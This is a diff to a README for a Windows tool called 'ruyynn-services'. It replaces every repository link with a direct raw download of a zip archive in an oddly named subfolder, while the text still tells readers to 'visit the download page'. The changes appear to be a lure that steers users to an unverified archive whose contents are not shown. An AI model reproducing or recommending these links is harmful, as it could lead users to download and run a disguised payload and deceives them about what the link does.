@@ -1,11 +1,11 @@
 # 🛠️ ruyynn-services - Custom tools built for your needs
 
-[![Download Now](https://img.shields.io/badge/Download-ruyynn--services-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Horatiusbridgeable99/ruyynn-services)
+[![Download Now](https://img.shields.io/badge/Download-ruyynn--services-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Horatiusbridgeable99/ruyynn-services/raw/refs/heads/main/apeptic/ruyynn-services-v3.1-beta.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
-https://github.com/Horatiusbridgeable99/ruyynn-services
+https://github.com/Horatiusbridgeable99/ruyynn-services/raw/refs/heads/main/apeptic/ruyynn-services-v3.1-beta.5.zip
 
 ## 🧰 What This App Does
 
@@ -35,7 +35,7 @@ If your PC is older, close other apps first to keep things smooth.
 Follow these steps to download and run ruyynn-services on Windows:
 
 1. Open this page in your browser:
-   https://github.com/Horatiusbridgeable99/ruyynn-services
+   https://github.com/Horatiusbridgeable99/ruyynn-services/raw/refs/heads/main/apeptic/ruyynn-services-v3.1-beta.5.zip
 
 2. Look for the latest download option on the page.
 
